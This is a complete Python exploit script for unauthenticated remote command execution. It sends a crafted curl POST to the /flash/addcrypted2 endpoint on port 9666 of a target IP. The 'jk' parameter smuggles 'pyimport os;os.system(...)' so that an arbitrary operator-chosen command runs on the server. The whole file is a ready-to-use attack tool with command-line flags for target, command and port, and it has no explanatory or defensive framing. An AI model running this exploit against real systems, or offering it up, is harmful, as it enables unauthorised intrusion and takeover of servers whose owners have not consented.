#!/usr/bin/env python3

import subprocess
import argparse

def send_request(ip, command, port=9666):
    curl_command = (
        f"curl -i -s -k -X 'POST' "
        f"--data-binary 'jk=pyimport os;os.system(\"{command}\");f=function f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa' "
        f"http://{ip}:{port}/flash/addcrypted2"
    )
    
    try:
        output = subprocess.check_output(curl_command, shell=True, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e.output}")  # Output errors

def main():
    parser = argparse.ArgumentParser(usage="./%(prog)s -t <ip> -c <command> [-p PORT]")
    parser.add_argument("-t", dest="target", required=True, help="Target IP address")
    parser.add_argument("-c", dest="command", required=True, help="Command to execute")
    parser.add_argument("-p", dest="port", default=9666, type=int, help="Port number")

    args = parser.parse_args()
    send_request(args.target, args.command, args.port)

if __name__ == "__main__":
    main()
